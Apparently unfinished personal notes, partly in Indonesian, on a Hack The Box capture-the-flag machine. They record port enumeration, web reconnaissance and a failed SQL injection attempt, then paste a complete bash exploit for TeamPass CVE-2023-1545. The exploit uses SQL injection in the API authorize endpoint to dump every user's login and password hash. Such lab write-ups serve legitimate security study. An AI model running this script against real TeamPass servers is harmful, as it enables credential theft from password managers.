![](Pasted%20image%2020250223103627.png)
# 1.  Service Enumeration

| IP  | Port       |
| --- | ---------- |
| TCP | 22,80,8080 |
| UDP | -          |
## A.  TCP Active Port 
![](Pasted%20image%2020250223103808.png)
## B. UDP Active Port
No result.
## C.  Domain
![](Pasted%20image%2020250223112458.png)
add them to /etc/host
# 2. Initial Access
## A. Web
Port 80
fitur:
- Login
- Forgot Password
![](Pasted%20image%2020250223104349.png)
Port 8080 
Fitur:
- Login, ada satu form unik dengan value 60
- menggunakan **Teampass** -> coba cek versi nya
![](Pasted%20image%2020250223104646.png)

## C. Directory
ga bisa ada waf kedua web servernya
![](Pasted%20image%2020250223111956.png)
ada rate limiting
![](Pasted%20image%2020250223104841.png)
## D. checker.htb Forgot Password
reflected
![](Pasted%20image%2020250223113128.png)
cannot be exploited yet
![](Pasted%20image%2020250223122524.png)
coba test SQLi injection save it to file, and send it to sqlmap
![](Pasted%20image%2020250223212122.png)
tidak berhasil
## E. Teampass
tidak menemukan version, coba cari manual
https://security.snyk.io/vuln/SNYK-PHP-NILSTEAMPASSNETTEAMPASS-3367612
[CVE-2023-1545](https://www.cve.org/CVERecord?id=CVE-2023-1545)
![](Pasted%20image%2020250224142310.png)
```
```php
if [ "$#" -lt 1 ]; then
  echo "Usage: $0 <base-url>"
  exit 1
fi

vulnerable_url="$1/api/index.php/authorize"

check=$(curl --silent "$vulnerable_url")
if echo "$check" | grep -q "API usage is not allowed"; then
  echo "API feature is not enabled :-("
  exit 1
fi

# htpasswd -bnBC 10 "" h4ck3d | tr -d ':\n'
arbitrary_hash='$2y$10$u5S27wYJCVbaPTRiHRsx7.iImx/WxRA8/tKvWdaWQ/iDuKlIkMbhq'

exec_sql() {
  inject="none' UNION SELECT id, '$arbitrary_hash', ($1), private_key, personal_folder, fonction_id, groupes_visibles, groupes_interdits, 'foo' FROM teampass_users WHERE login='admin"
  data="{\"login\":\""$inject\"",\"password\":\"h4ck3d\", \"apikey\": \"foo\"}"
  token=$(curl --silent --header "Content-Type: application/json" -X POST --data "$data" "$vulnerable_url" | jq -r '.token')
  echo $(echo $token| cut -d"." -f2 | base64 -d 2>/dev/null | jq -r '.public_key')
}

users=$(exec_sql "SELECT COUNT(*) FROM teampass_users WHERE pw != ''")

echo "There are $users users in the system:"

for i in `seq 0 $(($users-1))`; do
  username=$(exec_sql "SELECT login FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  password=$(exec_sql "SELECT pw FROM teampass_users WHERE pw != '' ORDER BY login ASC LIMIT $i,1")
  echo "$username: $password"
done
```
```






# 3. Privilege Escalation
## a. 

# 4. Post Exploitation
## a. User Flag
## b. Root Flag
